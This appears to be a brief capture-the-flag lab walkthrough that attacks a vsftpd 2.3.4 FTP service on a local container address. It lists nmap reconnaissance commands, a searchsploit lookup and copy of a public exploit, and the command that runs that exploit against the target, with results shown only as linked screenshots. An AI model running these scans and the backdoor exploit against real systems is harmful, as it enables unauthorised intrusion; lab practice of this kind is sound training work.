![image](https://github.com/user-attachments/assets/1c9ff203-f5a5-41b3-81d0-b5f581db390a)

## **we start the reconnaissance**
```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p21 172.17.0.2 -oN targeted
```
![Pasted image 20250121155440](https://github.com/user-attachments/assets/20416bf2-8035-49ff-9344-bb7cc7dc36d4)
![Pasted image 20250121155500](https://github.com/user-attachments/assets/56adb3bb-4de8-4519-9156-9b2a18fad9a5)
![Pasted image 20250121155609](https://github.com/user-attachments/assets/073b4ca0-445f-4557-8226-8c65c2a043f2)

```bash
searchsploit vsftpd 2.3.4
```
![Pasted image 20250121155804](https://github.com/user-attachments/assets/ef4d871a-f6e7-4cac-8e1e-959893513c38)

```bash
searchsploit -m unix/remote/49757.py
```
![Pasted image 20250121160005](https://github.com/user-attachments/assets/53e4cb06-34a5-41da-8f5f-76ac2d263be7)

## **this is the scrip we downloaded**
![Pasted image 20250121160202](https://github.com/user-attachments/assets/5ef7a43d-6898-4795-9e92-122596f8ca2b)

## **now we will use it by assigning it the ip to attack since it is already configured**
```bash
python3 49757.py 172.17.0.2
```
![Pasted image 20250121160341](https://github.com/user-attachments/assets/26fbcf9d-bf2c-4937-b43f-761733e13a10)








